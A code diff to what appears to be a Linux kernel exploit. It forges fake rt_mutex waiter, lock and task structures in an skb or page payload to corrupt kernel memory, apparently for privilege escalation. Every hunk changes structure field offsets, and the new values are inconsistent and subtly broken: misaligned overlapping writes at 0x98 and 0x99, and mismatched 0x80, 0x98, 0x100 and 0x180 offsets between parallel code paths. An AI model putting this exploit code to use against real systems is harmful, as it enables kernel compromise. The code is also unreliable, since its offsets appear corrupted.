@@ -307,14 +307,14 @@ void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                             uintptr_t pi_right, uintptr_t pi_left,
                             uintptr_t task, uintptr_t lock,
                             uint32_t priority) {
-  put64(payload, waiter_off + 0x00, tree_parent);
-  put64(payload, waiter_off + 0x08, tree_right);
-  put64(payload, waiter_off + 0x10, tree_left);
+  put64(payload, waiter_off + 0x90, tree_parent);
+  put64(payload, waiter_off + 0x98, tree_right);
+  put64(payload, waiter_off + 0x99, tree_left);
 #if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x90,
         pi_parent);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x98, pi_right);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x99, pi_left);
   put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
   put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
 #if COMPACT_RT_MUTEX_WAITER
@@ -328,10 +328,10 @@ void put_fake_waiter(unsigned char *payload, size_t waiter_off,
 #else
   put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
   put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x90,
         pi_parent);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x98, pi_right);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x100, pi_left);
   put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
   put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
   put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
@@ -421,9 +421,9 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 #endif
 
   put32(p, lock_off + 0x00, 0);
-  put64(p, lock_off + 0x08, waiter);
-  put64(p, lock_off + 0x10, waiter);
-  put64(p, lock_off + 0x18, lock_owner);
+  put64(p, lock_off + 0x98, waiter);
+  put64(p, lock_off + 0x100, waiter);
+  put64(p, lock_off + 0x180, lock_owner);
   put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                   waiter_task, lock, waiter_prio);
   put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
@@ -432,7 +432,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
   put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
-  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
+  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x80, pi_waiters);
   put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
   put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
 }
@@ -1678,9 +1678,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t waiter = payload_base + waiter_off;
 
         put32(p, lock_off + 0x00, 0);
-        put64(p, lock_off + 0x08, waiter);
-        put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, slide_bank_lock_owner(task));
+        put64(p, lock_off + 0x80, waiter);
+        put64(p, lock_off + 0x100, waiter);
+        put64(p, lock_off + 0x180, slide_bank_lock_owner(task));
 
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
@@ -1692,7 +1692,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
         put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x80,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
         put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
         put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
@@ -1837,11 +1837,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x80, 0);
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x80,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
     }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
